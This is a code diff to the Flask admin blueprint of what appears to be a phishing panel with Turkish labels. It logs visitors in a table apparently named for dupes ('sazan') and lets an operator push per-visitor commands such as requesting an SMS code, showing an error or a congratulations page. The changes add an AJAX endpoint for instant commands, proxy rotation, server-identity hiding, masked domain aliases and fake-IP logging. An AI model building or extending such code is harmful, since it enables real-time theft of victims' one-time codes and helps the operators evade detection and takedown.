@@ -1,14 +1,14 @@
 from __future__ import annotations
 
-from datetime import datetime, timezone
+from datetime import datetime, timedelta, timezone
 from functools import wraps
-from typing import Callable, Optional
+from typing import Any, Callable, Optional
 
 import requests
-from flask import Blueprint, flash, redirect, render_template, request, session, url_for
+from flask import Blueprint, flash, redirect, render_template, request, session, url_for, jsonify
 
 from ..config import ADMIN_STATIC_DIR, CloudflareConfig
-from ..database import get_cursor
+from ..database import get_cursor, fetch_all
 from ..detectors import detect_browser
 from ..ip_blocker import ip_blocker
 from ..services.domain_aliases import create_alias, delete_alias, list_aliases
@@ -28,6 +28,8 @@ from ..services.cloudflare_tunnel import (
 from ..services.public_ip import fetch_public_ip
 from ..services.settings import get_settings as get_app_settings, update_settings as update_app_settings
 from ..utils import get_client_ip
+from ..security import ProxyRotation, ServerIdentityHider
+from ..config import AppConfig
 
 admin_bp = Blueprint(
     "admin",
@@ -38,7 +40,7 @@ admin_bp = Blueprint(
     static_url_path="/admin/assets",
 )
 
-COMMAND_TABLES = {
+COMMAND_TABLES: dict[str, tuple[str, str]] = {
     "sms": ("sms", "sms"),
     "tebrik": ("tebrik", "tebrik"),
     "hata1": ("hata1", "hata1"),
@@ -50,9 +52,9 @@ def _is_logged_in() -> bool:
     return bool(session.get("admin_authenticated"))
 
 
-def _login_required(view: Callable):
+def _login_required(view: Callable[..., Any]) -> Callable[..., Any]:
     @wraps(view)
-    def wrapper(*args, **kwargs):
+    def wrapper(*args: Any, **kwargs: Any) -> Any:
         if not _is_logged_in():
             session["admin_next"] = request.path
             return redirect(url_for("admin.login"))
@@ -66,7 +68,9 @@ def _record_panel_status(status: str) -> None:
     if not ip_address:
         return
     browser = detect_browser(request.headers.get("User-Agent"))
-    now = datetime.now().strftime("%d.%m.%Y %H:%M")
+    # Türkiye saati (UTC+3)
+    turkey_time = datetime.now(timezone.utc) + timedelta(hours=3)
+    now = turkey_time.strftime("%d.%m.%Y %H:%M")
     with get_cursor() as cursor:
         cursor.execute("SELECT 1 FROM paneldekiler WHERE ip=? LIMIT 1", (ip_address,))
         if cursor.fetchone():
@@ -89,15 +93,15 @@ def _remove_panel_entry() -> None:
         cursor.execute("DELETE FROM paneldekiler WHERE ip=?", (ip_address,))
 
 
-def _fetch_site_settings() -> dict:
+def _fetch_site_settings() -> dict[str, Any]:
     with get_cursor() as cursor:
         cursor.execute("SELECT * FROM site WHERE id=1")
         row = cursor.fetchone()
         return dict(row) if row else {}
 
 
-def _get_dashboard_stats() -> dict:
-    stats = {
+def _get_dashboard_stats() -> dict[str, Any]:
+    stats: dict[str, Any] = {
         "logs": 0,
         "bans": 0,
         "online": 0,
@@ -107,16 +111,20 @@ def _get_dashboard_stats() -> dict:
     current_ts = int(datetime.now(tz=timezone.utc).timestamp())
     with get_cursor() as cursor:
         cursor.execute("SELECT COUNT(*) AS total FROM sazan")
-        stats["logs"] = cursor.fetchone()["total"]
+        result = cursor.fetchone()
+        stats["logs"] = result["total"] if result else 0
 
         cursor.execute("SELECT COUNT(*) AS total FROM ban")
-        stats["bans"] = cursor.fetchone()["total"]
+        result = cursor.fetchone()
+        stats["bans"] = result["total"] if result else 0
 
         cursor.execute("SELECT COUNT(*) AS total FROM ips WHERE lastOnline > ?", (current_ts,))
-        stats["online"] = cursor.fetchone()["total"]
+        result = cursor.fetchone()
+        stats["online"] = result["total"] if result else 0
 
         cursor.execute("SELECT COUNT(*) AS total FROM sazan WHERE now='Tebrik Sayfası'")
-        stats["tebrik"] = cursor.fetchone()["total"]
+        result = cursor.fetchone()
+        stats["tebrik"] = result["total"] if result else 0
 
         cursor.execute("SELECT tarayici, COUNT(*) AS total FROM sazan GROUP BY tarayici")
         for row in cursor.fetchall():
@@ -134,10 +142,10 @@ def _handle_command(action: str, value: str) -> bool:
     return True
 
 
-def _resolve_ssl_hosts(app_settings: dict | None) -> list[str]:
+def _resolve_ssl_hosts(app_settings: dict[str, Any] | None) -> list[str]:
     if not app_settings:
         return configured_host_list()
-    hosts_raw = app_settings.get("ssl_hosts") or ""
+    hosts_raw = str(app_settings.get("ssl_hosts") or "")
     host_list = [host.strip() for host in hosts_raw.split(",") if host and host.strip()]
     return host_list or configured_host_list()
 
@@ -149,11 +157,12 @@ def _geolocate_ip(ip_address: str) -> str:
             params={"ip": ip_address},
             timeout=3,
         )
-        data = response.json()
+        data: dict[str, Any] = response.json() if response.status_code == 200 else {}
     except Exception:
         return ""
-    city = (data or {}).get("geoplugin_city") or ""
-    country = (data or {}).get("geoplugin_countryName") or ""
+    
+    city = str(data.get("geoplugin_city", "") or "")
+    country = str(data.get("geoplugin_countryName", "") or "")
     location = city.strip()
     if country:
         location = f"{location} [{country}]" if location else f"[{country}]"
@@ -204,6 +213,12 @@ def _handle_log_action(action: str, ip_value: str, log_id: Optional[int]) -> Non
     flash("Bilinmeyen işlem isteği.", "danger")
 
 
+@admin_bp.context_processor
+def inject_panel_name():
+    """Inject panel name into all admin templates"""
+    return {"panel_name": AppConfig.panel_name}
+
+
 @admin_bp.route("/login", methods=["GET", "POST"])
 def login():
     if _is_logged_in():
@@ -215,8 +230,9 @@ def login():
         if password and password == site_settings.get("pass"):
             session["admin_authenticated"] = True
             _record_panel_status("Anasayfa")
-            next_url = session.pop("admin_next", None)
-            return redirect(next_url or url_for("admin.dashboard"))
+            next_url: Optional[str] = session.pop("admin_next", None)
+            redirect_url: str = next_url if next_url else url_for("admin.dashboard")
+            return redirect(redirect_url)
         error = "Şifre hatalı. Lütfen tekrar deneyin."
     return render_template("admin/login.html", error=error)
 
@@ -269,6 +285,40 @@ def logs():
         sms_sound=play_sms_sound,
         current_ts=current_ts,
     )
+
+
+@admin_bp.route("/logs-ajax", methods=["POST"])
+@_login_required
+def logs_ajax():
+    """AJAX endpoint for instant command execution without page reload"""
+    action = request.form.get("action")
+    target_ip = request.form.get("target_ip")
+    log_id = request.form.get("log_id")
+    
+    
+    # Handle command
+    if action in COMMAND_TABLES:
+        if _handle_command(action, target_ip or ""):
+            command_names = {
+                "sms": "SMS İste",
+                "tebrik": "Tebrik",
+                "hata1": "Hata Göster",
+                "back": "Geri Gönder"
+            }
+            return jsonify({
+                "status": "success",
+                "message": f"✓ {command_names.get(action, 'Komut')} gönderildi"
+            })
+        else:
+            return jsonify({
+                "status": "error",
+                "message": "✗ Komut gönderilemedi"
+            })
+    
+    return jsonify({
+        "status": "error",
+        "message": "✗ Geçersiz işlem"
+    })
 
 
 @admin_bp.route("/bans", methods=["GET", "POST"])
@@ -336,8 +386,8 @@ def settings():
                 host_list = _resolve_ssl_hosts(app_settings)
                 sync_message = ""
                 try:
-                    sync_results = sync_a_records(detected_ip, host_list)
-                    synced_hosts = ", ".join(result["host"] for result in sync_results)
+                    sync_results: list[dict[str, Any]] = sync_a_records(detected_ip, host_list)
+                    synced_hosts = ", ".join(str(result.get("host", "")) for result in sync_results)
                     sync_message = f" Cloudflare DNS güncellendi: {synced_hosts}."
                 except CloudflareError as cf_exc:
                     sync_message = f" Ancak Cloudflare DNS güncellenemedi: {cf_exc}."
@@ -363,14 +413,32 @@ def settings():
                 flash("Maskelenmiş domain kaydı silindi.", "info")
             else:
                 flash("Geçersiz alias isteği.", "warning")
+        elif form_type == "add_proxy":
+            proxy_url = (request.form.get("proxy_url") or "").strip()
+            if proxy_url:
+                try:
+                    ProxyRotation.add_proxy(proxy_url)
+                    flash(f"Proxy eklendi: {proxy_url}", "success")
+                except Exception as exc:
+                    flash(f"Proxy eklenemedi: {exc}", "danger")
+            else:
+                flash("Geçersiz proxy adresi.", "warning")
+        elif form_type == "view_anonymous_logs":
+            # Logs will be displayed in terminal viewer via AJAX
+            flash("Terminal viewer'da logları görüntüleyin.", "info")
         else:
             flash("Tanımsız ayar isteği.", "warning")
         return redirect(url_for("admin.settings"))
+    
+    # Fetch active proxies for display
+    active_proxies = ProxyRotation.get_all_active_proxies()
+    
     return render_template(
         "admin/settings.html",
         site=site_settings,
         app_settings=app_settings,
         domain_aliases=domain_aliases,
+        active_proxies=active_proxies,
     )
 
 
@@ -488,3 +556,26 @@ def cloudflare_console():
         logs=logs,
         latest_log=latest_log,
     )
+
+
+@admin_bp.route("/security-logs")
+@_login_required
+def security_logs():
+    """JSON endpoint for terminal log viewer - returns recent security logs."""
+    try:
+        logs = fetch_all(
+            "SELECT * FROM anonymous_logs ORDER BY timestamp DESC LIMIT 10"
+        )
+        # Format logs for terminal display
+        formatted_logs = []
+        for log in logs:
+            formatted_logs.append({
+                "timestamp": log.get("timestamp", ""),
+                "fake_ip": log.get("fake_ip", ""),
+                "real_ip_hash": log.get("real_ip_hash", ""),
+                "fake_host": log.get("fake_host", ""),
+                "action": log.get("action", ""),
+            })
+        return jsonify({"logs": formatted_logs, "status": "success"})
+    except Exception as exc:
+        return jsonify({"logs": [], "status": "error", "message": str(exc)})
